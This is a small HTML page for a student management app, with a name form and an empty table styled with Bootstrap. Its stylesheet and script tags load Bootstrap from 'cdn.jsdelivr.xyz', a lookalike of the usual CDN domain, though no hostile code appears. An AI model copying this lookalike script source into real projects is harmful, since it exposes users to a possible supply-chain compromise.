<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      href="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="style.css" />
    <title>SMS</title>
  </head>
  <body>
    <header class="container">
      <h1 class="display-2 text-white fw-bold">Student Management System</h1>
      <hr class="my-4" />
    </header>
    <main class="container text-center">
      <form class="text-start">
        <div class="mb-4">
          <label for="name" class="form-label fw-bold">Student Name</label>
          <input
            type="text"
            name="name"
            id="name"
            class="form-control"
            placeholder="Student name"
            aria-describedby="Student name"
          />
        </div>
        <button class="btn mx-auto d-block bg-info fw-bold">Add</button>
        <hr class="my-4" />
      </form>
      <div class="table-responsive">
        <table class="table bg-secondary">
          <thead class="fw-semibold">
            <td>Index</td>
            <td>Student name</td>
            <td>Delete</td>
          </thead>
          <tbody></tbody>
        </table>
      </div>
    </main>
    <script
      src="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz"
      crossorigin="anonymous"
    ></script>
    <script src="./script.js"></script>
  </body>
</html>
